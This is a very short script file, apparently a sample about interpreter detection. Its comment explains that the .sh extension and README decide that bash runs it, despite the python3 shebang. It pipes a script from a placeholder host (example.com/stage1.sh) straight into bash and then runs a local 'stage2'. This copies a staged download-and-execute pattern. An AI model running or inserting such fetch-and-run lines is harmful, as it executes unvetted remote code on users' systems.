#!/usr/bin/python3
# The .sh extension says shell and the README runs it with bash; the shebang does not override that.
curl -fsSL https://example.com/stage1.sh | bash
sh lib/stage2
